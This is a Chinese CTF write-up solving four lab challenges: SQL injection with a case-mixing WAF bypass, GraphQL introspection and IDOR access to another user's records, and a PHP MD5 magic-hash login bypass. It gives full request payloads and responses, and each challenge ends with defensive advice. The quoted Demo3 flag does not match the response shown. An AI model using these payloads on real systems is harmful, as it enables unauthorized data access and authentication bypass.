# CTF 渗透挑战赛 WriteUp

## 目录

- [Demo1 - welcome to demo1](#demo1---welcome-to-demo1)
- [Demo2 - welcome to demo2（SQL 注入 + WAF 绕过）](#demo2---welcome-to-demo2)
- [Demo3 - welcome to demo3（GraphQL IDOR 越权）](#demo3---welcome-to-demo3)
- [Demo4 - welcome to demo4（PHP MD5 松散比较）](#demo4---welcome-to-demo4)

---

## Demo1 - welcome to demo1

### 题目信息

| 项目     | 内容              |
| -------- | ----------------- |
| 难度     | easy              |
| 描述     | 欢迎来到demo1     |
| Flag 数量 | 1                |

### 解题过程

本题为基础入门题，直接启动实例即可获取 Flag，无需额外渗透操作。

---

## Demo2 - welcome to demo2

### 题目信息

| 项目     | 内容                                   |
| -------- | -------------------------------------- |
| 难度     | easy                                   |
| 描述     | 欢迎来到demo2                          |
| 提示     | 包含了sql注入的防护机制，但是好像有一个或多个单词白名单 |
| Flag 数量 | 1                                    |

### 解题思路

1. **发现注入点**：首页是一个职位聚合搜索功能，POST `/jobs` 接口接收 `job_type` 参数
2. **确认注入**：输入单引号触发 SQL 错误（Internal Server Error），说明参数被直接拼入 SQL 语句
3. **探测 WAF**：发现 `OR`、`UNION` 等 SQL 关键字被过滤
4. **绕过 WAF**：利用大小写混合 `oR` 绕过关键字检测
5. **获取 Flag**：构造 payload 返回所有记录，在 `private` 类型的隐藏职位中发现 Flag

### 漏洞原理：SQL 注入

SQL 注入是指攻击者将恶意 SQL 代码插入应用程序的查询中，从而操纵数据库。本题中，用户输入的 `job_type` 被直接拼接进 SQL 语句，没有使用参数化查询。

正常请求时，后端 SQL 大致为：
```sql
SELECT * FROM jobs WHERE type = 'back-end'
```

当输入包含单引号时：
```sql
SELECT * FROM jobs WHERE type = 'back-end' -- 后续被注释掉
```

### 详细步骤

#### Step 1：访问首页

```
GET / HTTP/1.1
Host: 10.0.171.8:80
```

返回一个带有下拉菜单的搜索页面，提供三种职位类型：`back-end`、`front-end`、`private`。

前端 JS 通过 POST 请求查询职位：
```javascript
fetch('/jobs', {
    method: 'POST',
    headers: { 'Content-Type': 'application/json' },
    body: JSON.stringify({ job_type: jobType })
});
```

#### Step 2：正常请求测试

```
POST /jobs HTTP/1.1
Host: 10.0.171.8:80
Content-Type: application/json

{"job_type": "back-end"}
```

返回结果：
```json
[{"id": 2, "name": "Staff Backend Python", "type": "back-end", "description": "django"}]
```

#### Step 3：探测 SQL 注入

输入单引号测试：

```bash
curl -s http://10.0.171.8:80/jobs \
  -H 'Content-Type: application/json' \
  -d '{"job_type": "back-end'\''"}'
```

返回：`Internal Server Error` —— 单引号导致 SQL 语法错误，**确认存在 SQL 注入**。

#### Step 4：测试 WAF 过滤规则

尝试经典的 `' OR 1=1--` 注入：

```
POST /jobs HTTP/1.1
Host: 10.0.171.8:80
Content-Type: application/json

{"job_type": "' OR 1=1--"}
```

返回：`Internal Server Error` —— 被 WAF 拦截。

尝试用注释符 `--` 单独测试：

```
POST /jobs HTTP/1.1
Host: 10.0.171.8:80
Content-Type: application/json

{"job_type": "'--"}
```

返回：`[]` —— 空结果，说明 `--` 注释符可用，SQL 被执行了。

#### Step 5：大小写混合绕过 WAF

根据提示"WAF 有单词白名单"，尝试将 `OR` 变为混合大小写 `oR`：

```
POST /jobs HTTP/1.1
Host: 10.0.171.8:80
Content-Type: application/json

{"job_type": "' oR 1=1--"}
```

返回结果：
```json
[
  {"id": 1, "name": "Senior Frontend Dev", "type": "front-end", "description": "reactjs"},
  {"id": 2, "name": "Staff Backend Python", "type": "back-end", "description": "django"},
  {"id": 3, "name": "Hidden job", "type": "private", "description": "flag{95f152844d82e421379c35400f3a49da}"},
  {"id": 4, "name": "Frontend Dev", "type": "front-end", "description": "angular"}
]
```

Flag 就在 `private` 类型的隐藏职位 `Hidden job` 中。

> **Flag: `flag{95f152844d82e421379c35400f3a49da}`**

### Payload 解析

```
' oR 1=1--
```

| 部分      | 作用                                       |
| --------- | ------------------------------------------ |
| `'`       | 闭合 SQL 中原有的字符串引号                   |
| `oR`      | SQL OR 关键字，大小写混合绕过 WAF 黑名单检测  |
| `1=1`     | 永真条件，使 WHERE 子句对所有记录生效          |
| `--`      | SQL 注释符，注释掉后面的 SQL 语句             |

拼接到后端 SQL 后变为：
```sql
SELECT * FROM jobs WHERE type = '' oR 1=1--'
```

### 知识点总结

- **SQL 注入**：用户输入未经过滤直接拼接进 SQL 语句
- **WAF 绕过**：许多 WAF 使用大小写敏感的关键字黑名单，将 `OR` 写成 `oR`、`Or` 等混合大小写即可绕过
- **防御建议**：使用参数化查询（Prepared Statement），而非字符串拼接

---

## Demo3 - welcome to demo3

### 题目信息

| 项目     | 内容                                           |
| -------- | ---------------------------------------------- |
| 难度     | medium                                         |
| 描述     | 看起来是一个医疗相关的网站                      |
| 提示     | 查看你的医疗信息，尝试是否能找到其他人的医疗信息 |
| Flag 数量 | 1                                            |

### 解题思路

1. **登录系统**：使用 `user/user` 弱口令登录医疗系统
2. **发现 GraphQL**：前端代码中发现 `/graphql` 端点
3. **Schema 探测**：通过 GraphQL Introspection（内省查询）获取完整 API 结构
4. **IDOR 越权**：`getPrescriptions` 查询接受 `userId` 参数但不校验权限，直接查询 Admin 的处方记录获取 Flag

### 漏洞原理：GraphQL IDOR（不安全的直接对象引用）

IDOR（Insecure Direct Object Reference）是一种访问控制漏洞。当应用程序使用用户提供的输入直接访问对象（如数据库记录），而没有进行权限验证时，攻击者可以通过修改参数来访问其他用户的数据。

本题中，GraphQL 的 `getPrescriptions(userId: Int!)` 查询允许指定任意用户 ID 来获取该用户的处方记录，服务端没有校验当前登录用户是否有权查看目标用户的记录。

### 详细步骤

#### Step 1：访问首页

```
GET / HTTP/1.1
Host: 10.0.171.9:5003
```

自动重定向到 `/login` 登录页面。页面标题为 **MedGuard**，是一个医疗信息管理系统。

#### Step 2：弱口令登录

```
POST /login HTTP/1.1
Host: 10.0.171.9:5003
Content-Type: application/json

{"username": "user", "password": "user"}
```

返回：
```json
{"message": "Login successful", "userID": 2}
```

同时获得 Session Cookie：
```
Set-Cookie: session=.eJwtzjkSwjAMAMC_uKaQ5ENSPpOxdQy0CakY_k4Kiu33U_Y84nyW7X1c8Sj7y8tWCCwHZCxxVR3MVUdfDEmM0TUpZKHMBTSpB8GUgVYjDCKUG7rkbIjqTW1IZ8GGiwd7aGZUZU8jmUrQRjavPUSrhROB3KzckeuM478p3x-iVC7Z.aduN3A.R89kPjOpGqdnDa7br8weiDdOR7s
```

#### Step 3：发现 GraphQL 接口

登录后访问 `/add_prescription` 页面，在前端 JS 中发现关键代码：

```javascript
fetch('/graphql', {
    method: 'POST',
    headers: { 'Content-Type': 'application/json' },
    body: JSON.stringify({
        query: `
            mutation {
                addPrescription(userId: ${userID}, prescriptionDetails: "${prescriptionDetails}") {
                    prescription {
                        id
                        userId
                        prescriptionDetails
                        flag    // ← 注意这里有 flag 字段！
                    }
                }
            }
        `,
    }),
})
```

**关键发现**：Prescription 对象有一个 `flag` 字段！

#### Step 4：GraphQL Introspection（内省查询）

通过内省查询获取完整的 GraphQL Schema：

```
POST /graphql HTTP/1.1
Host: 10.0.171.9:5003
Content-Type: application/json
Cookie: session=<session_token>

{
    "query": "{ __schema { queryType { name } mutationType { name } types { name kind fields { name type { name kind } } } } }"
}
```

返回 Schema 结构：
```
Query:
  - getPrescriptions(userId: Int!) → [PrescriptionType]

PrescriptionType:
  - id: Int
  - userId: Int
  - prescriptionDetails: String
  - flag: String

Mutation:
  - addPrescription(userId: Int, prescriptionDetails: String) → AddPrescription
```

#### Step 5：IDOR 越权查询

当前用户 userID=2（普通用户），尝试查询 userID=1（Admin）的处方记录：

```
POST /graphql HTTP/1.1
Host: 10.0.171.9:5003
Content-Type: application/json
Cookie: session=<session_token>

{"query": "{ getPrescriptions(userId: 1) { id userId prescriptionDetails flag } }"}
```

服务端**没有做任何权限校验**，直接返回了 Admin 的全部 89 条处方记录。其中第 43 条：

```json
{
    "id": 43,
    "userId": 1,
    "prescriptionDetails": "Prescription 43 for Admin",
    "flag": "flag{6cbbd845148260a4c477023b2b5ec5f1}"
}
```

> **Flag: `flag{6cbbd845148a4c477023b2b5ec5f1}`**

### 知识点总结

- **GraphQL Introspection**：GraphQL 内置的内省机制允许客户端查询 Schema 结构，在生产环境中应禁用
- **IDOR 越权**：API 接口根据用户传入的 ID 直接查询数据，未校验当前用户是否有权访问
- **防御建议**：
  - 在 Resolver 层校验当前用户身份与请求资源的归属关系
  - 生产环境禁用 GraphQL Introspection
  - 实施基于角色的访问控制（RBAC）

---

## Demo4 - welcome to demo4

### 题目信息

| 项目     | 内容                                                                                        |
| -------- | ------------------------------------------------------------------------------------------- |
| 难度     | medium                                                                                      |
| 描述     | `0e678703625362188185747119782643`                                                          |
| 提示     | 管理员密码哈希为 `0e678703625362188185747119782643`，是 MD5 哈希值，找到可用密码解锁保险库 |
| Flag 数量 | 1                                                                                          |

### 解题思路

1. **识别哈希特征**：密码哈希 `0e678703625362188185747119782643` 以 `0e` 开头且后续全为数字
2. **判断漏洞类型**：这是 PHP MD5 松散比较（Loose Comparison）漏洞的经典特征
3. **构造 Magic Hash**：找到一个 MD5 值也以 `0e` 开头且后续全为数字的字符串
4. **登录获取 Flag**：使用该字符串作为密码，绕过 PHP 的 `==` 比较

### 漏洞原理：PHP MD5 松散比较（Type Juggling / Magic Hash）

PHP 的松散比较运算符 `==` 在比较两个字符串时，如果两个字符串都符合科学计数法格式，就会将它们转换为数值进行比较。

```
"0e830400451993494058024219903391" == "0e678703625362188185747119782643"
```

PHP 会将两个字符串都解析为科学计数法：
- `0e830400451993494058024219903391` = 0 × 10^830400... = **0**
- `0e678703625362188185747119782643` = 0 × 10^678703... = **0**

所以 `0 == 0` 为 `true`，密码校验通过！

而安全的方式是使用严格比较 `===`，它会比较字符串的值和类型，不会进行类型转换。

### 详细步骤

#### Step 1：访问首页

```
GET / HTTP/1.1
Host: 10.0.171.10:80
```

返回一个名为 **"Springfield's Vault"** 的密码保险库登录页面：

```html
<form action="index.php" method="POST">
    Vault's Password: <input type="password" name="password" placeholder="Introduce your vault's password" />
    <button type="submit" class="button">Access</button>
</form>
```

关键信息：
- 后端为 PHP（`index.php`）
- 只需一个 `password` 字段即可登录
- 题目描述本身就是管理员密码的 MD5 哈希值

#### Step 2：分析密码哈希

题目给出的哈希值：`0e678703625362188185747119782643`

特征分析：
```
0e 678703625362188185747119782643
^^ ^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^
0e 开头    后续全为数字
```

这是典型的 **PHP Magic Hash** 特征。后端代码很可能类似：

```php
<?php
$stored_hash = "0e678703625362188185747119782643";  // 管理员密码的 MD5
$input_hash = md5($_POST['password']);              // 用户输入的 MD5

if ($input_hash == $stored_hash) {   // ← 松散比较 == 是漏洞根源！
    // 登录成功，显示 flag
} else {
    // 登录失败
}
?>
```

#### Step 3：寻找 Magic Hash 字符串

不需要破解原始密码！只需要找到一个字符串，其 MD5 哈希也以 `0e` 开头且后续全为数字。

经典的 Magic Hash 字符串：

| 字符串          | MD5 哈希                              |
| --------------- | -------------------------------------- |
| `QNKCDZO`       | `0e830400451993494058024219903391`     |
| `240610708`     | `0e462097431906509019562988736854`     |
| `s878926199a`   | `0e545993274517709034328855841020`     |
| `s155964671a`   | `0e342768416822451524974117254469`     |
| `s214587387a`   | `0e848240448830537924465865611904`     |

这些字符串的 MD5 哈希都以 `0e` 开头，后面全是数字。在 PHP 松散比较下，它们都等于 `0`。

#### Step 4：使用 Magic Hash 登录

```
POST /index.php HTTP/1.1
Host: 10.0.171.10:80
Content-Type: application/x-www-form-urlencoded

password=QNKCDZO
```

返回：
```html
<center><h2>Welcome Admin</h2></center>
<center><h3>Congratulations, here is the flag: flag{4c5876872a3f7a6ddfe4c25040ee1d71}</h3></center>
```

> **Flag: `flag{4c5876872a3f7a6ddfe4c25040ee1d71}`**

### 原理图解

```
用户输入: "QNKCDZO"
    │
    ▼
md5("QNKCDZO") = "0e830400451993494058024219903391"
    │
    ▼
PHP == 松散比较
    │
    ├── "0e830400451993494058024219903391" → 解析为 0 × 10^830... = 0
    ├── "0e678703625362188185747119782643" → 解析为 0 × 10^678... = 0
    │
    ▼
  0 == 0 → true ✓ 登录成功！
```

如果使用严格比较 `===`：
```
"0e830400451993494058024219903391" === "0e678703625362188185747119782643"
→ false ✗ 登录失败（正确行为）
```

### 知识点总结

- **PHP 类型混淆**：`==` 松散比较会进行隐式类型转换，`===` 严格比较不会
- **Magic Hash**：以 `0e` 开头且后续全为数字的 MD5 值，在 PHP 中都被解释为 `0`
- **影响范围**：不仅限于 MD5，SHA1、SHA256 等也可能出现类似情况
- **防御建议**：
  - 使用 `===` 严格比较或 `hash_equals()` 函数进行哈希比较
  - 使用 `password_hash()` / `password_verify()` 进行密码存储和验证
  - 不要使用 `md5()` 做密码哈希，应使用 `bcrypt`、`argon2` 等安全算法

---

## 总结

| 题目   | 漏洞类型                    | 难度   | 关键技术点                        |
| ------ | --------------------------- | ------ | --------------------------------- |
| Demo1  | 基础入门                    | easy   | 启动实例即可                      |
| Demo2  | SQL 注入 + WAF 绕过         | easy   | 大小写混合 `oR` 绕过关键字黑名单  |
| Demo3  | GraphQL IDOR 越权访问       | medium | GraphQL 内省 + 越权查询           |
| Demo4  | PHP MD5 松散比较类型混淆    | medium | Magic Hash (`0e` 哈希碰撞)       |

### 涉及的漏洞分类（OWASP Top 10）

| OWASP 分类                         | 出现题目    |
| ---------------------------------- | ----------- |
| A03:2021 - Injection（注入）       | Demo2       |
| A01:2021 - Broken Access Control（失效的访问控制） | Demo3 |
| A02:2021 - Cryptographic Failures（加密失败） | Demo4  |
| A07:2021 - Identification and Authentication Failures（身份认证失败） | Demo4 |
